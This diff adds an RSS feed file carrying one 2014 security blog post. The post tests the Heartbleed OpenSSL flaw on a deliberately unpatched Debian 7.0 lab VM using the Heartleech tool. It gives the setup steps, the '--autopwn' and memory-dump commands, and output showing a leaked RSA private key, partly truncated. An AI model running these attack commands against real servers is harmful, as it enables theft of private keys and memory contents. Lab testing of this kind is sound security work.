@@ -1,0 +1,95 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>heartbleed &#8211; Phocean.net</title>
+	<atom:link href="/blog-archive/tag/heartbleed/feed" rel="self" type="application/rss+xml" />
+	<link>/blog-archive</link>
+	<description>Computer Security Blog</description>
+	<lastBuildDate>Fri, 24 Feb 2017 21:17:51 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.9.10</generator>
+	<item>
+		<title>Testing Heartbleed vulnerability</title>
+		<link>/blog-archive/2014/07/14/testing-heartbleed-vulnerability.html</link>
+		<pubDate>Mon, 14 Jul 2014 21:48:23 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Pentesting]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Debian]]></category>
+		<category><![CDATA[heartbleed]]></category>
+		<category><![CDATA[pentest]]></category>
+		<category><![CDATA[SSL]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=1995</guid>
+		<description><![CDATA[No fresh news, but I had been wanting to test the Heartbleed vulnerability for a while and just missed time. I used the following quick setup: Debian 7.0 virtual machine as a vulnerable host Heartleech tool. There are many other tools around, but this one was suggested to me by a coworker, who used it successfully during a...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2014/07/14/testing-heartbleed-vulnerability.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>No fresh news, but I had been wanting to test the Heartbleed vulnerability for a while and just missed time.</p>
+<p>I used the following quick setup:</p>
+<ol>
+<li><strong>Debian 7.0</strong> virtual machine as a vulnerable host</li>
+<li><a href="https://github.com/robertdavidgraham/heartleech">Heartleech</a> tool. There are many other tools around, but this one was suggested to me by a coworker, who used it successfully during a pentest.</li>
+</ol>
+<p>Getting a vulnerable host in your own environment is not that trivial, as most OS have now been patched (including the installation ISO of supported versions).</p>
+<p>In my quest, I ended up with Debian 7.0 (Debian 6.x are too old and actually do not suffer from the vulnerability).</p>
+<p>To download an old and unpatched installation image of Debian, you need to use <em><strong>Jigdo</strong></em>. This tool will download all packages from the archive site of Debian and rebuild the ISO:</p>
+<pre>jigdo-lite ftp://cdimage.debian.org/cdimage/archive/7.0.0/i386/jigdo-dvd/debian-7.0.0-i386-DVD-1.jigdo</pre>
+<p>Then, create a virtual machine with no network card, to make sure that the installation process does not retrieve any patch.</p>
+<p>Once the Debian virtual machine is set and running:</p>
+<ol>
+<li>Edit &lt;code&gt;/etc/apt/source.list&lt;/code&gt; to comment out lines concerning security updates (keep only the DVD enabled)</li>
+<li>Add and configure a network card (&lt;code&gt;eth0&lt;/code&gt;)</li>
+<li>Install <em><strong>Apache2</strong></em></li>
+<li>Enable SSL: <code>a2enmod ssl</code></li>
+<li>Enable the default SSL web pages: &lt;code&gt;e2ensite default-ssl&lt;/code&gt;</li>
+<li>Open a browser to check that it all works at &lt;code&gt;https://hostname&lt;/code&gt;</li>
+</ol>
+<p>Using heartleech is incredibly fast and straightforward:</p>
+<pre>heartleech % ./heartleech 172.25.254.153 --autopwn
+--- heartleech/1.0.0i ---
+https://github.com/robertdavidgraham/heartleech
+786648 bytes downloaded (6.293-mbps)
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA40dv2FdGVHxQRydIyZixnNwnez6bFMyQu+AAjpFmphA39Lzr
+4rW8ca8uY0W34jeHx+qTNABkrmfOeZpTFbpCnU7ZDRy8J/KUoq6o26vdkg98fT/t
+VqlBPLEp6uD0bazvNp4H5KGO3f1c06y8uBjc4/hOPgiCYYi3aPQpV8ybHqkcdA4K
+ps6u9EYvXHwInUwXwOg13OynpYfsxJt2PSF/qoaz7zbU0ie7wMJFFFmXEMwT0uUX
+[...]
+ko+g0mrTttbz6egHRs3JFmV3oucnGCrTq/Z4Ivcsqdt059UhspDFxMPoesyUjMQs
+o8KZF5q2adNTxyoaQPiln9H9GjDSSKt448G9YM7CM7cAd7JkvFBdEjrRsP+4W92B
+3EPn1yMCgYEA+LARBdzOfFasv4/UWub85QersrT35hNneTrtaVTBiJR0v7jdXnqe
+k0aoHJV/D73j2hW3mGaC9JsnUMfZ3AkoDhfojZzqp2jOlaFNWZr80NDERekJrRTT
+3JVFVF33NAW3OWY97/52XRZzcGJTDx9fx8R3guS4tR5O/ETgdREPmAw=
+-----END RSA PRIVATE KEY-----</pre>
+<p>You can also dump the memory in a file:</p>
+<pre>./heartleech 172.25.254.153 --cert /tmp/debian --read /tmp/test</pre>
+<p>To further look for interesting content with <code>strings</code> or any parsing tool (<em>Yara</em>?) of your choice.</p>
+<p>It gives also an alternative method to retrieve the private key. First, download the public key from your browser to a file and apply it to the dump to look for the matching private key:</p>
+<pre>./heartleech 172.25.254.153 --cert /tmp/debian --read /tmp/test
+--- heartleech/1.0.0i ---
+https://github.com/robertdavidgraham/heartleech
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA40dv2FdGVHxQRydIyZixnNwnez6bFMyQu+AAjpFmphA39Lzr
+4rW8ca8uY0W34jeHx+qTNABkrmfOeZpTFbpCnU7ZDRy8J/KUoq6o26vdkg98fT/t
+VqlBPLEp6uD0bazvNp4H5KGO3f1c06y8uBjc4/hOPgiCYYi3aPQpV8ybHqkcdA4K
+ps6u9EYvXHwInUwXwOg13OynpYfsxJt2PSF/qoaz7zbU0ie7wMJFFFmXEMwT0uUX
+[...]
+ko+g0mrTttbz6egHRs3JFmV3oucnGCrTq/Z4Ivcsqdt059UhspDFxMPoesyUjMQs
+o8KZF5q2adNTxyoaQPiln9H9GjDSSKt448G9YM7CM7cAd7JkvFBdEjrRsP+4W92B
+3EPn1yMCgYEA+LARBdzOfFasv4/UWub85QersrT35hNneTrtaVTBiJR0v7jdXnqe
+k0aoHJV/D73j2hW3mGaC9JsnUMfZ3AkoDhfojZzqp2jOlaFNWZr80NDERekJrRTT
+3JVFVF33NAW3OWY97/52XRZzcGJTDx9fx8R3guS4tR5O/ETgdREPmAw=
+-----END RSA PRIVATE KEY-----</pre>
+<p>Neat!</p>
+<p>You may check <a href="https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-heartbleed-openssl-vulnerability">this page</a> to get information on vulnerable versions and remediation.</p>
+]]></content:encoded>
+			</item>
+	</channel>
+</rss>
